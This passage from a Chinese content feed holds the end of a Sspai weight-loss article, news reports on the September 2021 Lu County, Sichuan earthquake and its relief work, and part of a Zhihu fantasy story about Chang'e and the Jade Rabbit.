课程都挺好，而且在家就能练，我非常喜欢且推荐大家尝试</figcaption></figure><p>不仅如此，就我的运动经验而言，相对激烈的运动可以让自己在参与时更投入，运动结束后一身大汗，同时伴随着疲劳和愉悦，感受很好。</p>\n<h3>总结</h3>\n<p>总地来说，我在过去几年中没有特别刻意地减肥或者控制体重，但因为掌握了相对科学的方法，所以我并不担心体重会失控，也经常放开手脚大吃大喝。在我看来，了解和掌握这些方法的目的不是时时刻刻严控饮食和运动，而是更加了解自己身体的「底线」在哪里。</p>\n<hr>\n<p>希望你也能在评论区分享你的故事，或者提出在减肥过程中产生的困惑，说不准能得到解答。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68828"},{"title":"3人死亡88人受伤 紧急转移安置3212人——四川泸县地震救援现场直击","date":"2021-09-16 07:34:48","description":"\n<p>新华社成都9月16日电</p>\n<p>记者16日从四川省泸州市泸县新闻办获悉，截至9月16日11点，发生在四川泸县的6.0级地震已造成3人死亡，3人重伤，85人轻伤。全县居民房屋倒塌1221处，严重损坏3285间，一般受损20004间。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b93ec047a95b24bac81f560e60cf82f1_b.jpg\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"405\" class=\"origin_image zh-lightbox-thumb\" width=\"720\" data-original=\"https://pic2.zhimg.com/v2-b93ec047a95b24bac81f560e60cf82f1_r.jpg\"><figcaption>9月16日，救援人员在泸县福集镇大田社区抢修道路（手机图片）。据中国地震台网正式测定，9月16日4时33分，四川省泸州市泸县发生6.0级地震，震源深度10千米，震中位于北纬29.20度，东经105.34度。四川省抗震救灾指挥部启动二级地震应急响应。新华社发</figcaption></figure><p>地震发生后，新华社记者从成都出发奔赴灾区。9点5分，记者在大雨中进入震中嘉明镇，沿途见到有民房围墙倒塌。受地震影响，镇上民房大部分停电，沿街可见小商店货架倒地，群众正在清理商品。</p>\n<p>9点24分，记者抵达福集镇。大雨中，救援人员正挨家挨户排查危房中的居民，并将他们带至临时安置点。在大田社区党群服务中心安置点，工作人员为居民分发月饼、蛋糕等食物。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-c3b7c47bad37ed64b79f6f119a536bc5_b.jpg\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"540\" class=\"origin_image zh-lightbox-thumb\" width=\"720\" data-original=\"https://pic2.zhimg.com/v2-c3b7c47bad37ed64b79f6f119a536bc5_r.jpg\"><figcaption>9月16日，这是当地搭建的应急帐篷。 据中国地震台网正式测定，9月16日4时33分，四川省泸州市泸县发生6.0级地震，震源深度10千米，震中位于北纬29.20度，东经105.34度。四川省抗震救灾指挥部启动二级地震应急响应。新华社</figcaption></figure><p>福集镇居民赖建容告诉记者，凌晨4点左右她感觉到轻微震感。4点33分感到摇晃异常剧烈，她穿着睡衣、光着脚就跑了出来。“家里房子的墙体有砖脱落，不敢再进去。”天亮后，她被救援人员带到位于大田社区党群服务中心的广场安置点。</p>\n<p>记者在该安置点看到，工作人员正抓紧冒雨搭建帐篷，一些工作人员负责接收登记救援物资，还有志愿者服务安置群众，送去牛奶、面包、方便面等食品。考虑到降雨导致气温较低，工作人员在安置点帐篷全部搭建好之前，尽可能将老人和孩子安顿在党群服务中心室内。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-7003df23c16dc5304db6a576c2db1545_b.jpg\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"405\" class=\"origin_image zh-lightbox-thumb\" width=\"720\" data-original=\"https://pic2.zhimg.com/v2-7003df23c16dc5304db6a576c2db1545_r.jpg\"><figcaption>9月16日，救援人员在泸县福集镇大田社区转移受灾群众（手机图片）。据中国地震台网正式测定，9月16日4时33分，四川省泸州市泸县发生6.0级地震，震源深度10千米，震中位于北纬29.20度，东经105.34度。四川省抗震救灾指挥部启动二级地震应急响应。新华社发</figcaption></figure><p>截至9月16日11点，泸县全县共设安置点79个，紧急转移安置3212人，受灾群众人数仍在进一步统计中。</p>\n<p>目前，国家电网泸州供电公司正全力开展电网抢修。此外，记者从四川省公安厅获悉，为保证救援道路畅通，G4215成自泸高速泸县西收费站，G76厦蓉高速泸县收费站、隆昌收费站对地方车辆进行交通管控。</p>\n<p>新华社记者高健钧、袁波、吴光于</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xin-hua-she-3?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">新华社</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/410999703?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"四川泸县发生6.0级地震，子弟兵迅疾行动！当地情况如何？有什么自救知识分享一下？","date":"2021-09-16 07:00:02","description":"\n<h2>武警四川总队官兵紧急驰援地震灾区一线</h2>\n<p>解放军报讯 记者吴敏、特约通讯员洪福乐、姜永安报道：上午9时许，武警四川总队抗震救灾前指和360名官兵抵达泸州灾区。今日4时33分，泸州市泸县发生6.0级地震，震源深度10千米。为了人民群众生命财产安全，武警四川总队立即启动应急响应机制，司令员曹善贵第一时间组织召开作战会议，总队副参谋长金泽林率前指赶赴一线救援，泸州支队泸县中队官兵凌晨5时50分赶赴震中排查灾情、展开救援。 暴雨中，避险群众看到武警官兵纷纷求助，官兵们分组有序展开工作，配合当地应急部门和村委会走村入户核查灾情、转移群众、发放口罩等防疫物资。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d12b8d073db5136233a49cce7821c7cf_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"watermark\" data-original-src=\"v2-d12b8d073db5136233a49cce7821c7cf\" data-watermark-src=\"v2-9533284d0d2e1e7a441b668f3e39a9a8\" data-private-watermark-src=\"v2-ba48bdc53a5949c6a0ff800c3366fbd8\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f3d6cc771f8ec9bc8719fdea1fbc275f_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"864\" data-watermark=\"watermark\" data-original-src=\"v2-f3d6cc771f8ec9bc8719fdea1fbc275f\" data-watermark-src=\"v2-14ef607593b31d88046e532159be59ee\" data-private-watermark-src=\"v2-7f011ea1a05f3ce7bd6f8a7045674fc7\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-jun-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国军网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/487123600/answer/2123867110?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">7 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/20466160?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">地震发生后如何自救？</a><br><a href=\"http://www.zhihu.com/question/329905420?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">地震提前 60 秒预警可以挽回多少损失？普通人在这期间如何最大限度自救或减少损失？</a><br>\n","link":"http://www.zhihu.com/question/487123600/answer/2123867110?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何以「我是嫦娥怀里常抱着的玉兔」为开头写一个故事？","date":"2021-09-16 06:46:59","description":"\n<p>〔全文1.7W字，已完结〕</p>\n<p>我是嫦娥怀里常抱着的玉兔，嫦娥在这广寒宫伴了我五百年，我也被天庭囚禁了五百年。</p>\n<p>《月宫》</p>\n<p><b>壹</b></p>\n<p>「嫦娥妹妹——」</p>\n<p>我和嫦娥正待在广寒宫里眯着觉，隔着老远就听见天蓬元帅那粗狂的声音。</p>\n<p>自从上次在王母的蟠桃盛会上见过一面，天蓬便独自一人坠入了爱河，此后，广寒宫更是日日都充斥着他的身影。</p>\n<p>要是哪一天他没来，反倒是不习惯了。</p>\n<p>「今日怎么来早了些?」</p>\n<p>我在嫦娥怀里伸了个懒腰，毛茸茸的爪子扒拉着衣裙的月白色飘带，小脑壳在上面蹭了蹭，满脸惬意。</p>\n<p>嫦娥没有回答我的嘟囔，「醒了?要不要再睡会儿?」</p>\n<p>「不了，睡不着。」</p>\n<p>「那乖乖待着，我出去瞧瞧就回来。」</p>\n<p>她将我放到软榻上，我挪动着略显肥胖的身体寻了一个舒服的姿势躺好。</p>\n<p>感觉动作比以往慢了不少，这都要怪天蓬每次带来的伙食实在太好吃，天天被这么喂养，是只兔子都要胖。</p>\n<p>外头的谈话隐约入耳——</p>\n<p>「嫦娥妹妹，正巧俺今儿下界，就弄了点你以前最喜欢吃的糕子，给你送来了，喏，还有玉兔的零嘴，热乎着呢。」</p>\n<p>「这是你买的?」</p>\n<p>「嘿嘿……买的买的，俺给人家钱了，那以前都是误会。」</p>\n<p>「这么多东西，广寒宫除了我和玉兔也没别人，怎么吃得完？下次，还是不要送来了。」</p>\n<p>「没事，玉兔正长个儿呢，能吃！」</p>\n<p>「哎，天蓬！天蓬！」</p>\n<p>……</p>\n<p>我自觉地将爪伸进篮子，坐起身抱着一根胡萝卜开啃，还抽空点评了一下：「这萝卜比上次的新鲜。」</p>\n<p>「你不吃吗？」我把篮子推到她面前。</p>\n<p>「我没胃口。」</p>\n<p>嫦娥不复刚才的婉柔模样，嘴角扯得有些牵强，百无聊赖地坐着，双手绞动着腰间的带子。</p>\n<p>我又塞了一口糕点进嘴，口齿不清：「人间是怎么做出来这么多好吃的……」</p>\n<p>「我也想去看看你以前生活的地方。」</p>\n<p>突然，嫦娥一把扯开了我啃到一半的胡萝卜，差点儿把我两颗门牙磕着。</p>\n<p>不知道哪个字触碰到了她的敏感，她蓦地朝我大吼，「看什么看，一天到晚就知道吃的废物就该老实待着！」</p>\n<p>我听着这话也不恼，五百年的相处，已经习惯了她时不时的发疯。</p>\n<p>慢吞吞地咽下了手上最后一口糕点，肚子撑得圆滚滚的，没了骨头般靠在桌边，慵懒地眯起眼。</p>\n<p>「是啊，我不是一直都在这广寒宫里待着吗？」</p>\n<p>广寒宫，美名其曰是天庭划给嫦娥的居所，实则是一座牢狱。</p>\n<p>专门用来关我的牢狱。</p>\n<p>嫦娥充当着一个可有可无的看守人。</p>\n<p>「嫦娥，这五百年，你后悔吗？」</p>\n<p>我没问出口她具体后悔什么，但我们都心知肚明。</p>\n<p>她，后悔当年偷吃天庭赐给后羿的丹药了吗？</p>\n<p>后悔，杀了后羿吗？</p>\n<p>「我有什么可后悔的?」嫦娥冷哼一声，斜睨着我，「你这个犯人懂什么！」</p>\n<p>我提醒她道：「我可不是犯人。」</p>\n<p>「不是犯人?」她笑了起来，「不是犯人天庭会把你关起来?」</p>\n<p>「不是犯人你为何不能走出这广寒宫一步?！」</p>\n<p>「不是犯人……这偌大的月宫五百年来为何只有你我！！」</p>\n<p>说到后面时她神情已显几分癫狂，因为竭力的嘶吼，尖利的嗓子有些沙哑。</p>\n<p>手里那根萝卜骤然被扔了开来，在这广寒宫里倒是砸不出什么动静。</p>\n<p>「这里本来就是我的地方。」稍微一停顿，我继续道，「我说过，如果你想回到人间，我可以帮你。」</p>\n<p>「你?你都自身难保，还敢大言不惭的说帮我！」</p>\n<p>她仰着头大笑，最后笑弯了腰，再抬起头时，那张美丽的脸庞布满冰霜，冷冷地看着我道：「我最讨厌你那副控制一切的样子！明明，明明就是个可怜阶下囚不是吗？」</p>\n<p>「困者自困。」</p>\n<p>爪子在桂花木制成的桌上轻叩，一下又一下，两人都没再说话，唯有这拍打声飘荡在死寂的广寒宫内，余响缭绕不绝。</p>\n<p><b>贰</b></p>\n<p>隔日天蓬又按点送来了一盒子吃食，我的一双短手费劲地把它霸占在面前，大快朵颐。</p>\n<p>其实我不是很喜欢吃胡萝卜，天蓬看着人间那些兔子爱吃便认为我也一样，广寒宫的胡萝卜一直供应不断。</p>\n<p>说来刚开始还扯出不少闹剧，天蓬看上了人家铺子的东西，脑子也不太会拐弯，直接使了法术将卖摊上的尽数打包回了天庭。一次两次也就罢了，可一来一回的次数多了，难免会闹出些动静，最后被司法天神察觉，天蓬不可避免地领了一顿罚，至此后才晓得拿了人间的东西是要按照规矩给钱的。</p>\n<p>每次看着天蓬那憨厚又带点小滑头的样儿都忍俊不禁，就连冷心的嫦娥也常常被他逗笑，有他在，这广寒宫倒减少了点凄清。</p>\n<p>「嫦娥妹妹，吃得可好？」</p>\n<p>天蓬还站在宫外没有离去，字语滚过粗实的喉放出，正常的说话都像别人在吼嗓子。</p>\n<p>嫦娥踩着莲步身姿曼妙，腰间的小铃铛轻晃，铃音清脆悦耳，芊芊素手撩起珠帘，低着头道：「都好。」</p>\n<p>天蓬憨笑，「那……」</p>\n<p>还未等他说完，那道清丽如莺啼的脆声再次响起，「天蓬，日后无需麻烦了。」</p>\n<p>「嫦娥妹妹，你这说的什么话？俺一点也不觉得麻烦！」天蓬脸上有较真的薄怒，「还是说，我给嫦娥妹妹添麻烦了?要真如此，俺也不是那厚脸皮的，你要说一句厌烦了俺，俺日后定不再来！」</p>\n<p>我在里面听着这番铿锵有力的话笑出了声，天蓬也不是第一次这样说了，但说就说了，就像放的屁，隔天就消失得无影无踪，该来的还是来。</p>\n<p>「天蓬，我并未厌烦你，只是……」嫦娥有些无奈。</p>\n<p>「俺知道嫦娥妹妹你并未厌烦俺就行，不用多说了，俺今日来是想跟妹妹说，人间此时热热闹闹的，俺想请妹妹一起下凡游玩。」</p>\n<p>「很热闹吗?」</p>\n<p>「对！各处都挂上了灯笼，各种吃的玩的，还有一种特殊的饼子，听人说可好吃了，什么馅儿都有……」</p>\n<p>天蓬的话滔滔不绝，脸上都溢满了高兴的油光，嫦娥在心头默默算着时日，人间应是到了祭月节。</p>\n<p>在她还是一介凡人时，也曾跟着家人一起吃着月饼赏月，如今自己处在月亮上，方体会到给人间散发着清辉的地方究竟有多孤寒。</p>\n<p>她想着想着，不觉潸然泪下。</p>\n<p>天蓬见她落了泪，害怕触动到了什么伤心事，忙道：「嫦、嫦娥妹妹，你别哭，俺嘴笨！俺说错话了！是俺不好，俺再也不提了。」</p>\n<p>嫦娥没空搭话，放下帘子进了里屋。</p>\n<p>「你走吧。」</p>\n<p>轻飘飘的话薄如蝉翼，脆弱得都要碎了。</p>\n<p>「好，好。」天蓬识趣地不再上前叨扰，又站了半个多时辰方才离开。</p>\n<p><br></p>\n<p>「人间，是什么样子呢？」</p>\n<p>我歪着脑袋，思索地问道。</p>\n<p>嫦娥温柔轻抚着我顺软的白色皮毛，眼里还挂了几滴未消退的泪，「我已经不大记得了。」</p>\n<p>「在月宫上，看得见吗？」</p>\n<p>「眼神儿不好了，看不到。」</p>\n<p>「你想亲人吗？」</p>\n<p>她的手顿住，像是在努力回忆着什么，最终还是无果，「不记得了，几百年，肉体凡胎，早成灰了。」</p>\n<p>「后羿呢？」</p>\n<p>倏地，她的指甲死死掐进了我背上的肉，越收越紧，我却浑然不觉疼痛。</p>\n<p>她喘息得有些急促，抓着我的手在发抖，另一只手按着胸口，额头浸出细细密密的汗。</p>\n<p>一字一句像是用尽了全力从齿间磨出来：「为什么要问?」</p>\n<p>「为什么要问?！」</p>\n<p>「问这么多做什么?！」</p>\n<p>「你想出去?」</p>\n<p>「哈哈哈……」她眼泪都笑出来了，随即又变了脸，神色阴冷，伏低了身子凑在我耳边，「我们就该一起烂在这儿。」</p>\n<p>我无所谓地摆了摆爪子，偏头认真道：「你在逃避什么？」</p>\n<p>听到我这么问，她霎时怒不可遏，眼神一凛，满含斥责，「逃避?我为何会做那样无用的举动！」</p>\n<p>她冷笑道：「你又懂什么?！是后羿……是后羿先背叛了我！！」</p>\n<p><b>叁</b></p>\n<p>「咚——咚——咚——」</p>\n<p>我在睡梦中被接连不断的动静吵醒，感觉整个月宫都在颤动。</p>\n<p>「咚——咚——」</p>\n<p>像大锤直敲在脑壳，头疼得欲开裂。</p>\n<p>刹那间，脑海里涌起诡谲的风暴、闪电、闷雷，搅动着，妖邪横行。</p>\n<p>红色眼睛褪却，两只珠子里翻腾着浓重的晦暗，如那终年见不得光的万里海底。</p>\n<p>「噗——」</p>\n<p>一旁的嫦娥大惊，手忙脚乱地把我抱在怀里，绢帕忙不迭地擦拭着我嘴角淌下来的血。</p>\n<p>「你、你是怎么了？」</p>\n<p>她又把我抱紧了些，不过动作甚是轻柔，那身好看的素色衣裙已经染上了几抹血迹，刺眼得很。</p>\n<p>「外面……」</p>\n<p>我吞下一口上翻的血气，声音都比往常微弱了几分。</p>\n<p>嫦娥立马明白了我的意思，带着我快步行至广寒宫大门。</p>\n<p>广寒宫前有一颗五百多丈高的月桂树，粗壮的腰身恐有百人才能勉强合抱。</p>\n<p>树下正站着一个人，挥舞着手中的大斧砍向月桂。</p>\n<p>每砍一下，我便痛一分。</p>\n<p>这月桂树是几十万年前哥哥去东海衔了枝来给我种下的，靠着月宫的滋养而活。</p>\n<p>自从我沉睡之日算起，它已有十万余年没开过花。</p>\n<p>「嫦娥，如今这月宫，真是什么人都敢来踩一脚。」</p>\n<p>我面上平静地说着，语气淡得就像日常与她的闲聊。</p>\n<p>「你且在这里，我过去看看。」嫦娥稍显凝重，这还是自她飞升以来碰见的最棘手的事。</p>\n<p>「不用了。」</p>\n<p>这一声夹杂着浓浓的叹息，古朴又悠长。</p>\n<p>无数伤痕累累的往事渐渐浮上心头，穿梭了万年光阴，似有千钧重，要被压得喘不过气。</p>\n<p>随之而来，还有翻涌着血色的滔天戾气。</p>\n<p>「你回——」</p>\n<p>剩下的话语还未出口便夭折，嫦娥目光呆滞，再没了动作，被眼前的一幕生生骇在原地。</p>\n<p>狂风骤起，飞沙走石，无人发觉轨道上的太阳已经挪了开来，一直萦着清辉的月宫被黑雾完全笼罩，黑色锋刃肆意绞杀着，似要把空间都割裂。</p>\n<p>高大的月桂树半身都掩在风暴里，只听见枝叶间噼里啪啦的摩擦拍打。</p>\n<p>铺天盖地的呼啸声像张开血盆大口的猛兽吞噬空间内的一切，万物生机刹那之间被扼杀。</p>\n<p>寒意陡生。</p>\n<p><br></p>\n<p>吴刚面对这突发情况不知所措，迷失在了月宫之上。</p>\n<p>还好反应快，当时就举起斧子牢牢地劈向脚下的地，堪堪把身子固住。</p>\n<p>耳边传来一个阴冷至极的声音——</p>\n<p>「谁让你来的?」</p>\n<p>他稳了稳心神，恭敬道：「小人犯了错，特被玉帝罚到这月宫砍伐桂树……」</p>\n<p>他一说完，感觉周身更冷了几分，像是那无间地狱爬出来的妖魔顺着脊椎骨缠上他的脖子，后背早已冷汗涔涔。</p>\n<p>听完他的说辞，我低低地笑了起来，眼里是一团浓稠得化不开的雾气。</p>\n<p>天庭，未免欺人太甚！</p>\n<p>想把一切都毁灭的欲望膨胀到了顶点，我连后果都不想考虑，只想撕碎这层牢笼，然后出去，把天庭那些人全杀了。</p>\n<p>哪怕代价是陨落。</p>\n<p>他们碰了月桂，碰了我和哥哥最后的联系，碰了我的底线，该死。</p>\n<p>此时的月宫一点光亮都没有，被浓寂的黑气包裹，这才是我这十万年来最真实的模样，脱离了哥哥的庇护，回到那个——</p>\n<p>已经死去的太阴。</p>\n<p><b>肆</b></p>\n<p>就在我准备动用最后的力量时，一缕金光穿透压抑的云层，自东方撕破一个口子，直达月宫表面。</p>\n<p>接着金光越来越多，强势又温和地驱散开了月宫周围的黑雾，整个月宫都被金色笼罩。</p>\n<p>我呆呆地抬头望着上空，每一根白毛都加以金光点缀，暖洋洋的。</p>\n<p>倾洒而来的光芒照进眼底，我的眼睛又恢复到正常的红色，只觉得眼眶酸酸的，什么时候落了泪都不知道。</p>\n<p>我张了张嘴，喉间像是被烙铁滚过，声音很涩，炽热又嘶哑——</p>\n<p>「哥哥……」</p>\n<p>蕴了水汽的朦胧视线里，一群三足乌正展翅急速飞来，在月宫上空盘旋。</p>\n<p>其中一只停在了月桂枝头，下一刻就见那本已被砍下的枝桠奇迹般地愈合，参天大树恢复了原貌，瞧不出一点儿被破坏的痕迹。</p>\n<p>「这、这……」在一旁的吴刚已经完全傻眼，面上尽显崩溃之色，「这可如何是好啊！！」</p>\n<p>玉帝的命令可是要把树砍完才能抵消罪罚啊！</p>\n<p>他大力抡了一拳捶在树干，手臂上充满力量感的肌肉鼓起，外人都能感觉到这一拳下去力道必不会轻。</p>\n<p>可月桂却未受丝毫损伤。</p>\n<p>枝头的三足乌朝他看去一眼，吴刚顿时感到无穷无尽的压力如潮水般向他用来，几近灭顶。</p>\n<p>他踉跄了几步，不敢再与之对视，那道锐利如剑的眼神有着让人毛骨悚然的恐怖。</p>\n<p>突然，一直在上空盘旋着的三足乌成群地向他涌来，他惊疑不定，连连闪躲，胳膊乱甩，挥着斧头想要把它们驱走。</p>\n<p>无比壮硕的他在这群三足乌面前也显得渺小，猝不及防地被扔下了月宫，不知落入了凡间哪处。</p>\n<p>此时的凡间一派热闹欢腾的景象，万家灯火，绵延数十里不绝，繁华的街上人头攒动，空中飘浮的天灯与闪烁的星辰交相辉映。</p>\n<p>祭月节，以祭拜月神。</p>\n<p>高高在上的月宫在凡人眼里还是那副散着清辉的耀眼模样，圆如玉盘，清如台镜。</p>\n<p>此夜定是长明。</p>\n<p>狂乱颠倒的一切似是从未发生过，万物都回归到了最初。</p>\n<p>我定定坐在地上，一瞬不瞬地望着东方。</p>\n<p>哥哥冒着被天庭发现的危险赶来阻止我，自是不可久待。</p>\n<p>自从我被天庭重伤差点陨落，陷入了无尽的沉睡，被哥哥唤醒后又遭天庭禁锢在广寒宫，算起来，我们已是十万多年未曾相见。</p>\n<p>盘古开天，女娲造人，三皇治世，五帝定伦。</p>\n<p>人间广为流传的神话中，一直被落下了句——日月同辉</p>\n<p>盘古生于混沌，万八千岁，天地开辟，阳清为天，阴浊为地。</p>\n<p>日月也正是这时自混沌中脱胎。</p>\n<p>人们说月亮自己是没有光的，殊不知，就在十万多年前，月亮和太阳一样，那浑身的光芒可荣耀万古。</p>\n<p>日月同辉，日月相依相伴同时璀璨。</p>\n<p>真怀恋那时候啊……</p>\n<p>我和哥哥还只是一对普通兄妹，打打闹闹，形影不离，想去哪儿就去哪儿，无拘无束。</p>\n<p>所有美好都自女娲捏出了那些小人儿后不复存在。</p>\n<p>原以为与我们无甚干系，就这样井水不犯河水共处了近十万年，他们中的一些人通过修炼获得神力，便在我和哥哥身上打了主意。</p>\n<p>想要分开我们兄妹，按照他们所说的做，一个代表白昼，一个代表黑夜，为人间提供光明和时节变换。</p>\n<p>我们自是不肯。</p>\n<p>蝼蚁般的人，与我们何干?</p>\n<p>凭什么要我和哥哥去照顾他们?！</p>\n<p>还妄想着把我和哥哥分开，痴人说梦。</p>\n<p>但就在十万多年前，在天庭与我们的那场大战中，他们赢了。</p>\n<p>而我身受重伤，满身耀眼的光芒就此湮灭。</p>\n<p>要不是哥哥借了他的光一直托着我，我早就陨落于混沌。</p>\n<p>天庭需要我，也不能让我消失。按照天庭说的那般，我和哥哥如果遵照日升月落规律，哥哥的光刚好可以一直分在我身上，必要时天庭也会帮衬一把。</p>\n<p>一旦不听话，离了借助于哥哥的光，我便马上会陨落。</p>\n<p>这点，也被天庭利用来牵制住哥哥。</p>\n<p>算计得多好啊。</p>\n<p>这些我们曾经看不起的小人儿，简直聪明极了。</p>\n<p><b>伍</b></p>\n<p>「赤乌最近有何动静？」</p>\n<p>「回王母娘娘的话，并无动静。」</p>\n<p>男子恭顺地回答道，一板一眼，不带一丝感情起伏。</p>\n<p>主位上的人缓缓吐出一口浊气，紧锁的眉头放开了些许，又马上皱得死紧。</p>\n<p>长年累月的操劳烦忧让她鬓间染上了几缕风霜，面目习惯性地凝重。</p>\n<p>「一定要盯好赤乌，我最近……老有一种不详的预感。」</p>\n<p>回答她的也只有冷冰冰的两个字——</p>\n<p>「遵命。」</p>\n<p>她的头是又疼了起来，一手撑在座椅，一手颤巍地揉按着太阳穴，疲劳地轻阖着眼。</p>\n<p>「禺焘，这么多年，你还是怪我们吗？」</p>\n<p>「不敢。」</p>\n<p>男子做了个礼，挑不出一丝毛病。</p>\n<p>「哼……」她闷声苦笑，「不，你在怪我，你在怪玉帝，你在怪当初的所有人……」</p>\n<p>「回娘娘——」男子的声音骤然拔高，打断了她的话，做出了一番可视做忤逆的举动，嘴上却是与之不符的恭敬。</p>\n<p>「臣，不敢。」</p>\n<p>她见着男子这番作态，心头却更是苦涩，无力地扯动着嘴皮：「罢了，每次与你说起那件事你也不见得能听下去。」</p>\n<p>随即她猛地睁开了眼，明亮得惊人。</p>\n<p>稍稍坐正了身子，瞬间就变成那个在朝堂之上威仪的天庭之主，华贵威严不容侵犯。</p>\n<p>「你觉得，你凭什么生来就是神?」</p>\n<p>不等他搭话，一串诛心的拷问又接连而来。</p>\n<p>「凭什么活在这天庭之上，脱离肉体凡胎转世轮回人间疾苦?！」</p>\n<p>「又凭什么，享受着人间的爱戴与敬仰?」</p>\n<p>这下，男子也不晓得作何反应，默不作声地听着。</p>\n<p>她稍微平复了一下，方才道：「我与玉帝，均是经历了九万九千劫，这天庭那些老神仙，有哪一位不是历经千百种磨难方得神籍?而你，却唾手可得，只因你是我的儿子！！</p>\n<p>你不知道成为一个神必须要用人间的信仰和真心的祝愿！没有人间，我们这些神就什么都不是！</p>\n<p>我们也曾是他们之中的一员。</p>\n<p>我们成神，不是为了满足一己，不是为了享受高高在上的俯瞰，是要给人间提供庇护！是让人间安稳和乐，福祚永延！</p>\n<p>我们肩负着这样的使命成为神，感受着人间传来的无数希望与寄托。</p>\n<p>人间不稳，天庭也会大乱，没有了人间，天庭也将不复存在。」</p>\n<p>她说着，面上也有些激动之色，加重了几分语气，「而五百年前，赤乌骤然多出了九个分身，人间大旱，民不聊生，悲声载道，他们能有什么办法?只能将全部希望寄托于天庭！」</p>\n<p>听着这些，男子面上没有太大变化。</p>\n<p>她的嗓音有些喑哑，沉痛的过往被回忆翻出，眼圈带了点儿红，却是没有泪水。</p>\n<p>「子昊……子昊是为了众生，为了大义！」</p>\n<p>男子低了头，看不见表情。</p>\n<p>许久，才冷淡开口道：「不是你们，决定献出子昊的吗？玉帝和王母都做了主，谁敢不听从?」</p>\n<p>她像被人猛地刺了一剑，刺在心口上，一抽一抽地疼，还是挺直着腰杆，直勾勾地看着他。</p>\n<p>「想要得到就必须有所付出，任何事都要付出代价，哪怕，是用我的儿子的命……」</p>\n<p>「哼，说得好听！」男子冷笑，「那怎么不用你自己的命?！！」</p>\n<p>「毕竟，这样才更能显出你的大义不是吗？」</p>\n<p>她震惊地看着眼前的人，这是她的儿子，此刻却完全像个陌生人一般。</p>\n<p>自五百年前有了隔阂，禺焘便独自搬去了东海，难得见上一面。</p>\n<p>却不知，禺焘对他们的怨气已经到了如此地步。</p>\n<p>她有些恍惚，失去了一个儿子后，还要失去另一个。</p>\n<p>如果，这也是代价的话，那就来吧。</p>\n<p>所有的痛苦都朝她来。</p>\n<p>她不惧！</p>\n<p>她神色颓丧，笔直地端坐在高位。</p>\n<p>男子招呼也没打，抬脚快步走出了宫殿，那衣摆遮掩下的手臂处有着一个三足乌图案。</p>\n<p><b>陆</b></p>\n<p>「嫦娥，我想去人间看看。」</p>\n<p>「好。」</p>\n<p><br></p>\n<p>过着祭月节的人间热闹非凡，灯火通明。</p>\n<p>我和嫦娥下界，几乎找不到落脚的地方，人潮推搡着，辨不清方向。</p>\n<p>我看见店铺前面悬挂的灯笼，问道：「那上面画的是什么？」</p>\n<p>嫦娥微笑着，目含风情，秋波流转，叫路过的人看呆了去。</p>\n<p>朱唇轻启：「是月亮。」</p>\n<p>「……月亮?」我有些疑惑，「为何是兔子模样?」</p>\n<p>「因为月亮在人间又被叫做玉兔，是月宫符象。」</p>\n<p>「人间都是如此拥挤吗？」</p>\n<p>「不，因为今天是一个很重要的节日。」</p>\n<p>她温柔地拍了拍我的脑袋，抚顺了头顶几丝翘起来的呆毛。</p>\n<p>「好香啊……」我敏感的嗅觉捕捉到了空气中飘荡的香味，口水差点流出来了。</p>\n<p>她好笑地抱着我走到一处铺子前，上面摆满了诸多饼子，长得倒是差不多。</p>\n<p>无一例外，饼子也画着和灯笼上一样的月宫玉兔。</p>\n<p>看我这眼馋嘴馋的小模样，她自是深知我的脾性，朝店家道：「请帮我装一个小饼。」</p>\n<p>「好嘞，您要什么馅儿的？」</p>\n<p>「……五仁。」</p>\n<p>店家动作非常麻溜，三两下就把还温热的饼子用油纸包着递到面前。</p>\n<p>嫦娥从钱袋子里拿出了银两，我等不及地一把将饼子抢了过来，大口大口埋头猛吃。</p>\n<p>「您这兔子好生灵性，与今日相衬得很。」店家也被我这急切的动作逗乐。</p>\n<p>「说来，倒是与这饼子上画的玉兔有七八分像。」</p>\n<p>嫦娥抿唇轻笑，明艳生动，心情很好地与其调侃着：「这天下间的兔子，不都长这模样吗？」</p>\n<p>店家不好意思地挠了挠头，「就是觉得您这只兔子与其他的不一样。」</p>\n<p><br></p